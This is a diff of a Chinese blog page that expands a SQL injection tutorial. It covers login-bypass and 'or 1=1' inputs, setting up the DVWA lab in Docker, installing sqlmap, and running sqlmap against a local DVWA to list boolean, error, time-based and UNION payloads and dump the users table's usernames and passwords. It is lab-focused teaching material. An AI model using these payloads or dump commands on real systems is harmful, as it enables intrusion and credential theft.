@@ -271,7 +271,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Sat Feb 14 2026 18:43:35 GMT+0800">2026-02-14 18:43:35</span>
+                    <span class="datetime" data-updated="Sat Feb 14 2026 22:18:57 GMT+0800">2026-02-14 22:18:57</span>
                 </span>
             
         
@@ -308,17 +308,56 @@
 
                     
                          <p>原理：​用户输入的内容被直接拼接到SQL语句中执行​，导致恶意SQL代码被数据库执行。<br>场景：在用户可以操控的输入框中。<br>损失：数据泄露，数据丢失，数据篡改。</p>
-<h1 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h1><p>1 登录<br>入参：admin   password</p>
+<h1 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h1><p>1 登录<br>入参：admin   password</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND password=&#x27;123456&#x27;​</span><br></pre></td></tr></table></figure>
 
 <p>用户名填admin’ – 绕过密码登录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; --&#x27; AND password=&#x27;xxx&#x27;​</span><br></pre></td></tr></table></figure>
 
 
-<p>2 单引号测试 ‘​</p>
-<p>测试输入框，输入单引号，查看系统是否执行该sql，查看sql层面是否报错：You have an error in your SQL syntax</p>
+<p>2 单引号测试 ‘​<br>测试输入框，输入单引号，查看系统是否执行该sql，查看sql层面是否报错：You have an error in your SQL syntax</p>
 <p>3 or 1&#x3D;1​<br>测试输入框，<code>1&#39; or 1=1--​</code> 如返回了真实的数据，说明注入成功。</p>
-<h1 id="Docker-部署DVWA-靶场"><a href="#Docker-部署DVWA-靶场" class="headerlink" title="Docker 部署DVWA 靶场"></a>Docker 部署DVWA 靶场</h1>
+<h1 id="Docker搭建DVWA"><a href="#Docker搭建DVWA" class="headerlink" title="Docker搭建DVWA"></a>Docker搭建DVWA</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
+
+<p>默认账号 admin​，密码 password.</p>
+<p>登录后点左侧DVWA Security,把安全级别改成Low然后点Submit<br>![[d8f90ba2a41db17829e9bb0fdcad4d3e_MD5.jpg]]</p>
+<p>点击菜单SQL Injection</p>
+<h1 id="安装sqlmap"><a href="#安装sqlmap" class="headerlink" title="安装sqlmap"></a>安装sqlmap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 容器ID /bin/bash</span><br><span class="line">apt update &amp;&amp; apt install -y git python3 python3-pip</span><br><span class="line">git clone https://github.com/sqlmapproject/sqlmap.git /usr/local/sqlmap</span><br><span class="line">ln -s /usr/local/sqlmap/sqlmap.py /usr/bin/sqlmap</span><br><span class="line">chmod +x /usr/local/sqlmap/sqlmap.py</span><br></pre></td></tr></table></figure>
+
+<h1 id="验证注入"><a href="#验证注入" class="headerlink" title="验证注入"></a>验证注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 9ba5053c75ef /bin/bash </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=session值xxx&quot;</span><br></pre></td></tr></table></figure>
+<p>-u​：指定目标URL（带了注入参数）</p>
+<p>session从DVWA页面，chrome中复制PHPSESSID的值。</p>
+<p>根据命令行提示选择选项。</p>
+<p>DVWA输出的表数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: id=1&#x27; OR NOT 3547=3547#&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id=1&#x27; AND EXTRACTVALUE(2001,CONCAT(0x5c,0x7176627871,(SELECT (ELT(2001=2001,1))),0x71787a6271))-- dpSp&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 8409 FROM (SELECT(SLEEP(5)))uhXu)-- rGZB&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=1&#x27; UNION ALL SELECT CONCAT(0x7176627871,0x4f426364714e7154594f4b486662514a706e4648766c586c505a457057746d4e7a77646c4a757a75,0x71787a6271),NULL#&amp;Submit=Submit</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h1 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=ae42ab8250dd8b6cdb6c597b53127d14&quot; -D dvwa -T users -C username,password --dump -batch</span><br></pre></td></tr></table></figure>
+<p>​-D dvwa​：指定攻击的数据库<br>​-T users​：指定攻击的表是 users<br>-C username,password​：指定要导出的字段</p>
+<h1 id="MySQL-的典型注入方式"><a href="#MySQL-的典型注入方式" class="headerlink" title="MySQL 的典型注入方式"></a>MySQL 的典型注入方式</h1><table>
+<thead>
+<tr>
+<th>注入类型</th>
+<th>通俗解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>boolean-based blind（布尔盲注）</td>
+<td>通过构造真假条件（比如1’ OR 1&#x3D;1#​），根据页面是否显示内容判断注入是否生效</td>
+</tr>
+<tr>
+<td>error-based（报错注入）</td>
+<td>构造恶意 SQL 让数据库报错，从报错信息中提取数据</td>
+</tr>
+<tr>
+<td>time-based blind（时间盲注）</td>
+<td>构造SLEEP(5)​这类语句，根据页面响应时间判断条件是否成立</td>
+</tr>
+<tr>
+<td>UNION query（联合查询注入）</td>
+<td>用UNION ALL SELECT​拼接语句，直接读取数据库中的数据（最直接、效率最高）</td>
+</tr>
+</tbody></table>
+
                     
                 </div>
 
@@ -374,7 +413,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">常用场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker-%E9%83%A8%E7%BD%B2DVWA-%E9%9D%B6%E5%9C%BA"><span class="nav-text">Docker 部署DVWA 靶场</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-text">注入基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker%E6%90%AD%E5%BB%BADVWA"><span class="nav-text">Docker搭建DVWA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85sqlmap"><span class="nav-text">安装sqlmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="nav-text">验证注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA"><span class="nav-text">导出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL-%E7%9A%84%E5%85%B8%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-text">MySQL 的典型注入方式</span></a></li></ol>
     </div>
 </div>
 
@@ -505,7 +544,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">常用场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker-%E9%83%A8%E7%BD%B2DVWA-%E9%9D%B6%E5%9C%BA"><span class="nav-text">Docker 部署DVWA 靶场</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-text">注入基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker%E6%90%AD%E5%BB%BADVWA"><span class="nav-text">Docker搭建DVWA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85sqlmap"><span class="nav-text">安装sqlmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="nav-text">验证注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA"><span class="nav-text">导出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL-%E7%9A%84%E5%85%B8%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-text">MySQL 的典型注入方式</span></a></li></ol>
     </div>
 </div>
 
